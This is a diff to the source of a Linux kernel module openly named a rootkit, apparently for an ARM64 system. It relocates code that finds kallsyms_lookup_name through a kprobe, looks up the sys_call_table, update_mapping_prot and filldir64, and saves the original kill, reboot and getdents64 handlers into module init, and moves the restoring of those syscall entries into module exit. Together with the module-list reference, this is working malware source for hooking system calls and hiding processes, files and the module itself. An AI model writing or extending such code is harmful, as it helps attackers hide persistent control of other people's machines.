@@ -58,32 +58,11 @@ static void modify_syscall_table(syscall_fn_t *hook_arr,
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
-	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
-	register_kprobe(&kp);
-	kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
-	unregister_kprobe(&kp);
-
-	sys_call_table_ptr = (syscall_fn_t *)
-		kallsyms_lookup_name_ptr("sys_call_table");
-	update_mapping_prot_ptr = (void (*)(phys_addr_t, unsigned long,
-					    phys_addr_t, pgprot_t))
-		kallsyms_lookup_name_ptr("update_mapping_prot");
-	filldir64_ptr = (filldir_t)kallsyms_lookup_name_ptr("filldir64");
-	sys_kill_orig = sys_call_table_ptr[__NR_kill];
-	sys_reboot_orig = sys_call_table_ptr[__NR_reboot];
-	sys_getdents64_orig = sys_call_table_ptr[__NR_getdents64];
 	return 0;
 }
 
 static int rootkit_release(struct inode *inode, struct file *filp)
 {
-	int syscall_nr_arr[3] = { __NR_reboot, __NR_kill, __NR_getdents64 };
-	syscall_fn_t hook_arr[3] = { sys_reboot_orig,
-				     sys_kill_orig,
-				     sys_getdents64_orig };
-
-	modify_syscall_table(hook_arr,syscall_nr_arr, 3);
-
 	return 0;
 }
 
@@ -265,6 +244,7 @@ static int __init rootkit_init(void)
 {
 	int ret;
 	dev_t dev_no, dev;
+	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
 
 	kernel_cdev = cdev_alloc();
 	kernel_cdev->ops = &fops;
@@ -287,11 +267,31 @@ static int __init rootkit_init(void)
 
 	modules_head = THIS_MODULE->list.prev;
 
+	register_kprobe(&kp);
+	kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
+	unregister_kprobe(&kp);
+
+	sys_call_table_ptr = (syscall_fn_t *)
+		kallsyms_lookup_name_ptr("sys_call_table");
+	update_mapping_prot_ptr = (void (*)(phys_addr_t, unsigned long,
+					    phys_addr_t, pgprot_t))
+		kallsyms_lookup_name_ptr("update_mapping_prot");
+	filldir64_ptr = (filldir_t)kallsyms_lookup_name_ptr("filldir64");
+	sys_kill_orig = sys_call_table_ptr[__NR_kill];
+	sys_reboot_orig = sys_call_table_ptr[__NR_reboot];
+	sys_getdents64_orig = sys_call_table_ptr[__NR_getdents64];
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
+	int syscall_nr_arr[3] = { __NR_reboot, __NR_kill, __NR_getdents64 };
+	syscall_fn_t hook_arr[3] = {
+		sys_reboot_orig,
+		sys_kill_orig,
+		sys_getdents64_orig
+	};
+	modify_syscall_table(hook_arr,syscall_nr_arr, 3);
 	cdev_del(kernel_cdev);
 	unregister_chrdev_region(major, 1);
 }
